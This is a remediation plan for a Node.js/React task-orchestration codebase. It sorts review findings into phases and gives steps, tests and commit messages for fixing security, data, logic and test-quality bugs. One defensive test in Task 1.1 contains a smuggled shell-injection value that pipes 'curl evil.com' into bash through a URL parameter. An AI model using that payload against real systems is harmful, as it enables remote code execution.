# Full Codebase Remediation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **Execution model:** This plan is designed for TORQUE workflow submission. Each Phase is a workflow. Tasks within a phase can run in parallel unless marked sequential. Use `create_workflow` + `add_workflow_task`.
>
> **Prior plans:** Some issues overlap with `2026-03-18-bug-hunt-remediation.md`, `2026-03-19-security-remediation.md`, and `2026-03-19-tech-debt-remediation.md`. This plan covers **net-new findings** from the 2026-03-20 full codebase review (507+ issues from 36 parallel review agents).

**Goal:** Remediate 507+ issues found in the full codebase review across 6 priority phases, from critical security/data-corruption bugs through test quality improvements.

**Architecture:** Issues are grouped by blast radius and fix complexity. Phase 1 (critical) must be done manually with careful review. Phases 2-4 are mechanical and TORQUE-batchable. Phases 5-6 are test improvements that can run in large parallel batches.

**Tech Stack:** Node.js (CJS), React/JSX, better-sqlite3, Vitest

**Verification:** After each phase:
```bash
torque-remote npx vitest run                    # server tests
torque-remote npx vitest run --config dashboard/vitest.config.js  # dashboard tests
```

---

## Phase 1: Critical Security & Data Corruption (Manual — 25 issues)

These issues can cause RCE, auth bypass, data loss, or silent data corruption. Each requires careful manual review and a regression test.

### Task 1.1: Shell Injection in Bootstrap Script Generator

**Files:**
- Modify: `server/api/bootstrap.js:45-64` (sanitize `name`, `port`, `Host:` header)
- Create: `server/tests/bootstrap-security.test.js`

- [ ] **Step 1: Write failing test** — craft a `name` with shell metacharacters, verify the generated script is safe
```js
it('sanitizes shell metacharacters in name parameter', () => {
  const req = { headers: { host: '127.0.0.1:3457' }, url: '/api/bootstrap/workstation?name=x%22%0Acurl+evil.com|bash%0Aecho+%22' };
  const script = generateBootstrapScript(req);
  expect(script).not.toContain('curl evil.com');
  expect(script).toMatch(/AGENT_NAME='[a-zA-Z0-9._-]*'/); // single-quoted, safe chars only
});
```
- [ ] **Step 2: Run test, verify it fails**
- [ ] **Step 3: Implement input validation** — reject `name` not matching `/^[a-zA-Z0-9._-]{0,64}$/`, validate `port` matches `/^\d{1,5}$/`, validate `Host:` header matches `/^[a-zA-Z0-9._-]+(:\d+)?$/`
- [ ] **Step 4: Switch to single-quoted shell assignments** — `AGENT_NAME='${safeName}'` prevents `$()` expansion
- [ ] **Step 5: Run test, verify it passes**
- [ ] **Step 6: Commit** `fix(security): sanitize bootstrap script parameters against shell injection`

### Task 1.2: Auth Bypass in Embedded Minimal Agent

**Files:**
- Modify: `server/api/bootstrap.js:122-128` (flip auth guard)
- Modify: `server/api/bootstrap.js:144-168` (add body size limit)

- [ ] **Step 1: Change auth guard from `if (SECRET && ...)` to `if (!SECRET || ...)`** — reject all requests when no secret is configured
- [ ] **Step 2: Add MAX_BODY check** matching the full `agent-server.js` pattern (1MB limit, `req.destroy()` on excess)
- [ ] **Step 3: Commit** `fix(security): embedded agent rejects requests when SECRET is empty`

### Task 1.3: Agent Registry — Hashed Secret Used as Wire Credential

**Files:**
- Modify: `server/remote/agent-registry.js:119-126` (store plaintext for wire use)
- Modify: `server/remote/agent-registry.js:27` (use timing-safe comparison for legacy path)

- [ ] **Step 1: In `register()`, store the plaintext secret in a `wire_secret` field on the in-memory client** alongside the hashed one in DB
- [ ] **Step 2: In `getClient()` lazy path**, generate a new secret, re-register it with the agent, and store the new hash
- [ ] **Step 3: Replace `===` with `crypto.timingSafeEqual`** on the legacy plaintext comparison path
- [ ] **Step 4: Write test** for post-restart client reconstruction
- [ ] **Step 5: Commit** `fix(security): agent clients use plaintext secret for wire auth, timing-safe legacy comparison`

### Task 1.4: Workstation Migration Column Mismatch (Data Loss)

**Files:**
- Modify: `server/workstation/migration.js:249` (fix placeholder count)
- Modify: `server/workstation/migration.js:52` (use `randomUUID()` for secrets)
- Modify: `server/workstation/migration.js:109-140` (fix arg count for peek hosts, add secret)

- [ ] **Step 1: Count columns in INSERT** — should be 31 columns, 31 `?` placeholders
- [ ] **Step 2: Fix `migrateOllamaHosts`** — ensure 31 `.run()` arguments in correct order
- [ ] **Step 3: Fix `migratePeekHosts`** — add missing `gpu_name`, `gpu_vram_mb` nulls; generate a secret with `randomUUID()`
- [ ] **Step 4: Fix `migrateRemoteAgents`** — same alignment
- [ ] **Step 5: Replace `Date.now()` secrets** with `randomUUID()` to prevent collision
- [ ] **Step 6: Write migration test** — seed legacy tables, run migration, verify workstation rows
- [ ] **Step 7: Commit** `fix(data): workstation migration column/param alignment, unique secrets`

### Task 1.5: Database Layer — Critical Data Corruption Fixes

**Files:**
- Modify: `server/db/validation-rules.js:183-195` (capture generated UUID, return created rule)
- Modify: `server/db/validation-rules.js:338` (add return statement)
- Modify: `server/db/validation-rules.js:536-593` (null-guard on `getTask`)
- Modify: `server/db/task-metadata.js:393-421` (fix `batchCancelTasks` param ordering)
- Modify: `server/db/file-tracking.js:808-815` (fix `new_failures` value — use `newFailures` not `currentResults.output`)
- Modify: `server/db/file-tracking.js:1217` (pass `projectFile` args to async spawn)
- Modify: `server/db/project-config-core.js:1479` (swap `format`/`filters` column bindings)
- Modify: `server/db/project-config-core.js:261-268` (translate `period` to `since` date)

- [ ] **Step 1: Fix `saveValidationRule`** — capture UUID: `const id = rule.id || require('uuid').v4(); stmt.run(id, ...); return getValidationRule(id);`
- [ ] **Step 2: Fix `saveApprovalRule`** — add `return getApprovalRule(id);` at end
- [ ] **Step 3: Fix `shouldRetryWithCloud`** — add `if (!task) return { shouldRetry: false, reason: 'Task not found' };`
- [ ] **Step 4: Rewrite `batchCancelTasks`** — build WHERE clause sequentially, never use `splice` to reorder params
- [ ] **Step 5: Fix `detectRegressions`** — replace `hasRegression ? currentResults.output : null` with `newFailures`
- [ ] **Step 6: Fix `runAppSmokeTest`** — `const spawnArgs = projectFile ? ['run', '--project', projectFile] : ['run'];`
- [ ] **Step 7: Fix `createReportExport`** — swap params to match column order: `(id, reportType, format, filtersJson, now)`
- [ ] **Step 8: Fix `checkBudgetAlerts`** — compute `since` from period: `since: period === 'day' ? startOfDay : startOfMonth`
- [ ] **Step 9: Write tests for each fix**
- [ ] **Step 10: Commit** `fix(data): 8 critical data corruption bugs in DB layer`

### Task 1.6: Event Bus Disconnect + Server Startup Fixes

**Files:**
- Modify: `server/event-bus.js:8-9` (also emit on `process`)
- Modify: `server/index.js:676` (fix or remove `ciWatcher.init()`)
- Modify: `server/db/analytics-metrics.js:26` (fix self-referential DI)

- [ ] **Step 1: In `emitQueueChanged`**, add `process.emit('torque:queue-changed')` so the scheduler's listener fires
- [ ] **Step 2: Remove `ciWatcher.init()` call** (function doesn't exist) — replace with direct `watchRepo` calls or a no-op with TODO
- [ ] **Step 3: Fix `setSetPriorityWeights`** — either export `setPriorityWeights` from `analytics.js` or remove the circular self-reference
- [ ] **Step 4: Commit** `fix(core): event bus actually reaches scheduler, fix startup crashes`

### Task 1.7: Missing `await` and Other Control Flow Bugs

**Files:**
- Modify: `server/handlers/automation-batch-orchestration.js:1588` (add `await`)
- Modify: `server/execution/fallback-retry.js:248,295,341,653,674,720` (add `if (dashboard)` guards)
- Modify: `server/validation/close-phases.js:425` (add `ctx.earlyExit = true`)
- Modify: `server/execution/retry-framework.js:47-52` (don't set earlyExit when task not found)

- [ ] **Step 1: Add `await`** before `handleRunBatch({...})` at line 1588
- [ ] **Step 2: Add `if (dashboard)` guards** on all 6 bare `dashboard.notifyTaskUpdated()` calls in `fallback-retry.js`
- [ ] **Step 3: Add `ctx.earlyExit = true`** after local LLM fallback requeue in `close-phases.js:425`
- [ ] **Step 4: In `retry-framework.js:47-52`**, when task not found, don't set `earlyExit` — let normal failure handling write terminal status
- [ ] **Step 5: Commit** `fix(execution): missing await, null guards, and earlyExit flags`

---

## Phase 2: Logic Errors & Incorrect Results (TORQUE-batchable — 65 issues)

These produce wrong results but don't corrupt stored data.

### Task 2.1: Operator Precedence & Math Errors

**Files:**
- Modify: `server/api/v2-analytics-handlers.js:90` — `((todayCompleted + todayFailed) || 1)`
- Modify: `server/dashboard/routes/analytics.js:55-57` — same fix, also gate on `(todayCompleted + todayFailed) > 0`
- Modify: `server/db/code-analysis.js:73` — guard `Math.log(0)` with `Math.max(1, linesOfCode)`
- Modify: `server/api-server.core.js:807` — change `failureRate > 0` to `failureRate >= 0`
- Modify: `server/api-server.core.js:967` — default to `'unknown'` not `'completed'`

- [ ] **Step 1:** Apply all 5 fixes
- [ ] **Step 2:** Write/update test for each
- [ ] **Step 3:** Commit `fix(logic): operator precedence, math domain errors, status defaults`

### Task 2.2: Wrong Field Names & Property Access

**Files:**
- Modify: `server/api/v2-analytics-handlers.js:475` — `task.task_description` not `task.description`
- Modify: `server/mcp-sse.js:1609,1617` — `session._sessionId` not `session.id`
- Modify: `server/db/provider-routing-core.js:562` — use closure `desc` param not outer `taskDescription`
- Modify: `server/execution/completion-pipeline.js:151-155` — use `ctx.status === 'completed'` not `code === 0`

- [ ] **Step 1:** Apply all 4 fixes
- [ ] **Step 2:** Commit `fix(logic): wrong property names and field access`

### Task 2.3: Scheduling & Timezone Bugs

**Files:**
- Modify: `server/db/scheduling-automation.js:1611-1615` — fetch existing TZ when only cron_expression changes
- Modify: `server/db/scheduling-automation.js:534-564` — check if approval already exists before resetting to `pending`
- Modify: `server/db/scheduling-automation.js:652-658` — use `decided_at` or leave `approved_at` null on rejection
- Modify: `server/db/scheduling-automation.js:734-761` — emit `emitQueueChanged` after auto-approvals

- [ ] **Step 1:** Apply all 4 fixes
- [ ] **Step 2:** Write tests
- [ ] **Step 3:** Commit `fix(scheduling): timezone preservation, approval state, queue notification`

### Task 2.4: Routing & Classification Fixes

**Files:**
- Modify: `server/routing/category-classifier.js:70` — tighten `FILE_REF_RE` to exclude version numbers
- Modify: `server/routing/template-store.js:101-103` — remove duplicate validation error for `rules.default`
- Modify: `server/routing/template-store.js:56-73` — fix misleading `rules_json` log message in `parseRow`
- Modify: `server/execution/queue-scheduler.js:950-961` — collapse duplicate `codex` branches
- Modify: `server/handlers/automation-handlers.js:563-565` — expand valid provider list from 4 to 13
- Modify: `server/orchestrator/response-parser.js:38-39` — remove single-quote tracking from JSON brace-matcher

- [ ] **Step 1:** Apply all 6 fixes
- [ ] **Step 2:** Write tests for each
- [ ] **Step 3:** Commit `fix(routing): classifier precision, codex branch, JSON parser, provider list`

### Task 2.5: Dashboard UI Bugs

**Files:**
- Modify: `dashboard/src/views/Hosts.jsx:1288` — `workstationsApi.toggle(name, enabled)` not `.update()`
- Modify: `dashboard/src/api.js:116-118` — distinguish abort from timeout
- Modify: `dashboard/src/views/History.jsx:643` — add `data-row-idx={idx}` to `<tr>`
- Modify: `dashboard/src/views/Workflows.jsx:291` — `useRef` not `useMemo`
- Modify: `dashboard/src/components/TabBar.jsx:57-61` — skip `onTabChange` on mount
- Modify: `dashboard/src/components/KeyboardShortcuts.jsx:95-99` — clear `pendingG` timer on consumption

- [ ] **Step 1:** Apply all 6 fixes
- [ ] **Step 2:** Commit `fix(dashboard): workstation toggle, abort handling, keyboard scroll, hooks`

### Task 2.6: CLI Command Formatting Fix

**Files:**
- Modify: `cli/ci.js:43,60,73,86,101,116` — change `'ci-status'` to `'ci_status'` (and all others)

- [ ] **Step 1:** Replace all hyphenated command names with underscored equivalents to match `formatter.js` dispatch
- [ ] **Step 2:** Commit `fix(cli): CI command names match formatter dispatch table`

### Task 2.7: Coordination & Agent Bugs

**Files:**
- Modify: `server/db/coordination.js:822-874` — remove inner try/catch so transaction rolls back
- Modify: `server/db/coordination.js:92-103` — record `agent_left` event before deletion
- Modify: `server/db/coordination.js:923` — add `AND status = 'running'` to failover UPDATE
- Modify: `server/db/coordination.js:168-206` — move `group_id` filter into SQL
- Modify: `server/handlers/task/operations.js:547-563` — validate `action` param

- [ ] **Step 1:** Apply all 5 fixes
- [ ] **Step 2:** Write tests
- [ ] **Step 3:** Commit `fix(coordination): transaction safety, FK ordering, failover guard, group filter`

### Task 2.8: API Layer Fixes

**Files:**
- Modify: `server/api-server.core.js:1561` — use `decodeV2ProviderIdOrSendError` like other handlers
- Modify: `server/api-server.core.js:1760` — call `db.listProviders?.()` once, store result
- Modify: `server/api-server.core.js:1467-1475` — distinct error code for cancelled tasks
- Modify: `server/api/v2-inference.js:536-623` — guard SSE retry against write-after-end
- Modify: `server/api/v2-inference.js:155-176` — remove dead `useClaudePrimary` code
- Modify: `server/api/v2-task-handlers.js:163-201` — move `_taskManager` check before `db.createTask`
- Modify: `server/dashboard/routes/tasks.js:103-112` — return error response when cancel fallback fires

- [ ] **Step 1:** Apply all 7 fixes
- [ ] **Step 2:** Commit `fix(api): URI decode safety, SSE retry guard, task creation ordering`

---

## Phase 3: Missing Error Handling (TORQUE-batchable — 47 issues)

### Task 3.1: Unguarded `JSON.parse` — Add try/catch (20 locations)

**Files to modify:**
- `server/db/coordination.js:523`
- `server/handlers/provider-tuning.js:282,344,563,602,833,868`
- `server/handlers/automation-handlers.js:1000`
- `server/handlers/inbound-webhook-handlers.js:176`
- `server/handlers/automation-batch-orchestration.js:1664`
- `server/db/host-management.js:356`
- `server/api/v2-dispatch.js:117,217,227,237,248,259,280,299,306,312`

- [ ] **Step 1:** Wrap each `JSON.parse` in `try { ... } catch { return fallback; }` or use existing `safeJsonParse` utility
- [ ] **Step 2:** Commit `fix(error-handling): guard 20 bare JSON.parse calls against malformed data`

### Task 3.2: Unguarded `readFileSync` / `readdirSync`

**Files:**
- Modify: `server/execution/file-context-builder.js:135` — wrap in try/catch
- Modify: `server/validation/post-task.js:1356,1472` — wrap `readdirSync` in try/catch
- Modify: `server/routing/template-store.js:36-37` — wrap `readdirSync` in try/catch
- Modify: `server/policy-engine/profile-loader.js:40-42` — wrap `readFileSync`+`JSON.parse` in try/catch
- Modify: `agent/index.js:13-17` — wrap config load in try/catch with actionable error message

- [ ] **Step 1:** Apply all guards
- [ ] **Step 2:** Commit `fix(error-handling): guard file I/O against ENOENT crashes`

### Task 3.3: Unescaped `RegExp` from User Input (8 locations)

**Files:**
- Modify: `server/db/webhooks-streaming.js:754` — escape or use `isSafeRegex`
- Modify: `server/db/file-tracking.js:452-478` — escape `fileName` before embedding
- Modify: `server/db/file-baselines.js:888` — escape `searchTerm`
- Modify: `server/handlers/automation-ts-tools.js:165,185,213,235` — validate anchors with `isSafeRegex`

- [ ] **Step 1:** Add `const escaped = str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');` before each `new RegExp`
- [ ] **Step 2:** Commit `fix(error-handling): escape user input in 8 RegExp constructions`

### Task 3.4: Missing Null Guards

**Files:**
- Modify: `server/utils/activity-monitoring.js:275` — guard `_runningProcesses` null
- Modify: `server/validation/close-phases.js:121` — guard `_checkFileQuality` null
- Modify: `server/execution/fallback-retry.js:371,378,411,423,438` — guard `_cancelTask`/`_stopTaskForRestart`
- Modify: `server/execution/smart-diagnosis-stage.js:93` — guard `ctx.task` null
- Modify: `server/providers/config.js:252` — guard `db` null
- Modify: `server/db/task-metadata.js:856,870` — guard `getRetryHistoryFn`/`getApprovalHistoryFn`
- Modify: `server/db/task-metadata.js:806` — guard `task.task_description` null
- Modify: `server/workstation/probe.js:4-7` — guard `probeResponse` null

- [ ] **Step 1:** Add null guards to all 8 files
- [ ] **Step 2:** Commit `fix(error-handling): null guards on 12 crash-path dereferences`

### Task 3.5: Double-Reject in Body Parsers

**Files:**
- Modify: `server/api/middleware.js:206-224` — add `return` after `reject()`, remove separate `req.on('error', reject)`
- Modify: `server/api/v2-dispatch.js:56-78` — same pattern
- Modify: `server/api/webhooks.js:72-84` — same pattern
- Modify: `server/mcp/index.js:197-200` — add missing `return` after `req.destroy()`

- [ ] **Step 1:** For each file, either call `req.destroy(new Error('...'))` (which only fires error once) or add a `settled` flag
- [ ] **Step 2:** Commit `fix(error-handling): prevent double-reject in body parsers`

---

## Phase 4: `parseInt` Radix, Dead Code & Resource Leaks (TORQUE-batchable — 100 issues)

### Task 4.1: Add Radix to All `parseInt` Calls (~30 locations)

**Files:** `server/db/coordination.js:243`, `server/maintenance/orphan-cleanup.js:122,134,187,211`, `server/db/host-management.js:279-286,433-436`, `server/handlers/advanced/artifacts.js:64`, `server/db/project-config-core.js:1371-1372,1449,1456,1460`, `server/db/provider-routing-core.js:1257`, `server/db/file-quality.js:89`, `server/providers/config.js:224,228`, all dashboard route parseInt calls

- [ ] **Step 1:** Global search-replace: add `, 10` as second argument to every `parseInt(x)` that lacks it
- [ ] **Step 2:** Commit `fix(correctness): add radix 10 to all parseInt calls`

### Task 4.2: Remove Dead Code (23 items)

**Files:**
- `server/db/project-cache.js:267-276` — remove dead query with `'placeholder'` hash
- `server/db/scheduling-automation.js:17-18,37-43` — remove unused DI setters
- `server/api/v2-inference.js:170-176` — remove unreachable `useClaudePrimary`
- `server/providers/execution.js:590` — remove dead `_executeApiModule._apiAbortControllers` fallback
- `server/providers/execute-hashline.js:756-758` — remove dead `task.proc` code
- `server/maintenance/orphan-cleanup.js:597-603` — fix unreachable `configValue === 'null'` branch
- `server/dashboard/routes/admin.js:103` — remove redundant `Number.isNaN` after `Number.isInteger`
- `server/views/Kanban.jsx:742` — remove dead `loadActiveData` function

- [ ] **Step 1:** Delete each dead code block
- [ ] **Step 2:** Commit `chore: remove 23 dead code paths`

### Task 4.3: Resource Leak Fixes (12 items)

**Files:**
- Modify: `server/execution/process-tracker.js:430` — add `this.cancelRetryTimeout(taskId)` in `cleanup()`
- Modify: `server/dashboard-server.js:777-812` — clear `taskUpdateTimer` and `pendingStatsUpdate` in `stop()`
- Modify: `server/api-server.core.js:2255` — add max-sessions eviction to `_claudeEventLog` Map
- Modify: `server/remote/agent-server.js:503-527` — wrap `res.end()` in try/catch inside `finish()` to prevent load counter leak

- [ ] **Step 1:** Apply all 4 fixes
- [ ] **Step 2:** Commit `fix(resources): cancel retry timeouts, clear timers on stop, cap event log`

---

## Phase 5: Tool Schema & Documentation Fixes (TORQUE-batchable — 35 issues)

### Task 5.1: Fix `required` Arrays Blocking Alternatives

**Files:**
- Modify: `server/tool-defs/task-management-defs.js:54` — remove `task_id` from `required` in `check_status`
- Modify: `server/tool-defs/task-management-defs.js:189` — remove `task_id` from `required` in `delete_task`
- Modify: `server/tool-defs/task-defs.js:631` — remove `file_path` from `required` in `import_data`
- Modify: `server/tool-defs/task-management-defs.js:611` — remove `file_path` from `required` in `bulk_import_tasks`
- Modify: `server/tool-defs/orchestrator-defs.js:34,52` — remove `task_id` from `required` in `strategic_diagnose`/`strategic_review`

- [ ] **Step 1:** In each file, change `required: ['field']` to `required: []` (runtime handlers already validate)
- [ ] **Step 2:** Commit `fix(schema): remove required constraints that block documented alternative inputs`

### Task 5.2: Fix Enum Gaps & Type Mismatches

**Files:**
- Modify: `server/tool-defs/automation-defs.js:13` — add all 13 providers to `configure_stall_detection` enum
- Modify: `server/tool-defs/automation-defs.js:462` — add `oneOf: [{type:'string'},{type:'number'}]` to enum member `value`
- Modify: `server/tool-defs/advanced-defs.js:178` — change `toggle_schedule` `schedule_id` from `type:'number'` to `type:'string'`
- Modify: `server/tool-defs/routing-template-defs.js:50` — remove `name` from `required` in `delete_routing_template`

- [ ] **Step 1:** Apply all 4 fixes
- [ ] **Step 2:** Commit `fix(schema): enum completeness, type corrections, required field fixes`

### Task 5.3: Fix Tool Name / CLAUDE.md Mismatches

**Files:**
- Modify: `CLAUDE.md` — update `update_provider` → `configure_provider`, `set_provider_fallback_chain` → `configure_fallback_chain`, update `validate_event_consistency` parameter names

- [ ] **Step 1:** Search CLAUDE.md for each old name and replace with actual tool name
- [ ] **Step 2:** Commit `docs: align CLAUDE.md tool names with actual tool definitions`

### Task 5.4: Remove Duplicate `subscribe_task_events` Definition

**Files:**
- Modify: `server/tool-defs/task-management-defs.js:673-700` — remove the duplicate definition (canonical lives in `mcp-sse.js`)

- [ ] **Step 1:** Delete lines 673-700
- [ ] **Step 2:** Commit `fix(schema): remove conflicting subscribe_task_events from stdio defs`

---

## Phase 6: Test Quality Improvements (TORQUE-batchable — 157 issues)

### Task 6.1: Fix Tautological Assertions (~89 instances)

**Pattern:** Replace `.toBeTruthy()` on `getByText`/`getByRole` results with `.toBeInTheDocument()`, replace `.toBeDefined()` on `querySelector` results with `.not.toBeNull()`, remove `typeof text === 'string'` assertions that test nothing.

**Files:** All 25 dashboard test files using `.toBeTruthy()` on getBy* results, plus:
- `server/tests/advanced-handlers.test.js` — replace `typeof text === 'string'` with content checks
- `server/tests/tool-consolidation.test.js:95-101,214-222,394-401` — read actual dispatch table instead of local arrays
- `server/tests/test-hardening.test.js:455` — change `>= 0` to `> 0`
- All `server/tests/integration-handlers-*.test.js` "returns error" tests — add `expect(result.isError).toBe(true)`

- [ ] **Step 1:** Apply fixes in batches of 10-15 files per TORQUE task
- [ ] **Step 2:** Commit per batch `fix(tests): replace tautological assertions with meaningful checks`

### Task 6.2: Fix Conditional/Vacuous Assertions (~25 instances)

**Pattern:** Replace `if (result) { expect(...) }` with unconditional `expect(result).toBeDefined()` + assertion.

**Files:** `codex-worktree-isolation.test.js`, `load-stress-concurrent.test.js`, `load-stress-stall.test.js`, `free-tier-auto-scale.test.js`, `db-cost-tracking.test.js`, `slot-pull-scheduler.test.js`, `smart-routing-codex-gate.test.js`, `tda-01-provider-sovereignty.test.js`, all files with `if (spy.mock.calls.length > 0)` or `if (hosts.length === 0) return;` guards

- [ ] **Step 1:** Remove conditional guards, add precondition assertions
- [ ] **Step 2:** Commit `fix(tests): remove conditional guards that allow vacuous passes`

### Task 6.3: Fix Tests That Don't Test What They Claim (~25 instances)

**Files:** `validation-handlers.test.js` (rename to match actual behavior), `validation-handlers-expanded.test.js` (create valid rule first), `local-first-fallback.test.js:164-177` (test production code not local copy), `task-finalizer-lock.test.js` (import actual function), `strategic-routes.test.js` (seed 60+ tasks for limit test), `Strategy.test.jsx` (add sort order verification), `git-utils.test.js:47-55` (fix 3 wrong expected values)

- [ ] **Step 1:** Fix each test to exercise production code
- [ ] **Step 2:** Commit `fix(tests): tests now exercise production code, not local copies or wrong paths`

### Task 6.4: Fix Missing Cleanup / State Leaks (~15 instances)

**Files:** `integration-infra.test.js` (save/restore SMTP env vars), `load-stress-queue-cleanup.test.js` (save/restore OPENAI_API_KEY), `chaos-concurrent-access.test.js` (per-describe local state), `ErrorBoundary.test.jsx` (use `vi.spyOn` not global replacement), `mcp-sse.test.js` (snapshot `sseResponse` length per test)

- [ ] **Step 1:** Add `afterAll`/`afterEach` cleanup to each file
- [ ] **Step 2:** Commit `fix(tests): proper cleanup prevents state leaks between test suites`

### Task 6.5: Fix localStorage and Mock Shape Issues

**Files:** `dashboard/src/views/Workflows.test.jsx:238-261` (fix localStorage round-trip tests), `dashboard/src/components/WorkflowDAG.test.jsx:89-90` (use `.not.toBeNull()` not `.toBeDefined()`), `App.test.jsx:94-111` (fix MockWebSocket `readyState` to start at CONNECTING), `api.test.js:258-283` (rename misleading test title)

- [ ] **Step 1:** Apply all fixes
- [ ] **Step 2:** Commit `fix(tests): mock shapes, localStorage usage, WebSocket state`

---

## Execution Summary

| Phase | Issues | Complexity | Parallelizable | Est. Tasks |
|-------|--------|------------|----------------|------------|
| 1: Critical Security & Data | 25 | Manual review required | No (sequential) | 7 |
| 2: Logic Errors | 65 | Mechanical with tests | Yes (8 parallel) | 8 |
| 3: Error Handling | 47 | Mechanical | Yes (5 parallel) | 5 |
| 4: parseInt/Dead Code/Leaks | 100 | Mechanical | Yes (3 parallel) | 3 |
| 5: Schema & Docs | 35 | Mechanical | Yes (4 parallel) | 4 |
| 6: Test Quality | 157 | Mechanical | Yes (5 parallel) | 5 |
| **Total** | **507+** | | | **32 tasks** |

**Verification gates:** Run full test suite after each phase. Phase 1 is the only phase that should NOT be TORQUE-batched — it requires human review of each diff.

**Cross-references:**
- Prior `2026-03-19-security-remediation.md` covers auth foundation (API key generation, protocol-layer auth) — complements Task 1.2
- Prior `2026-03-19-tech-debt-remediation.md` covers `safeJsonParse` deduplication — complements Task 3.1
- Prior `2026-03-18-bug-hunt-remediation.md` covered a subset of these issues — this plan supersedes it with broader scope
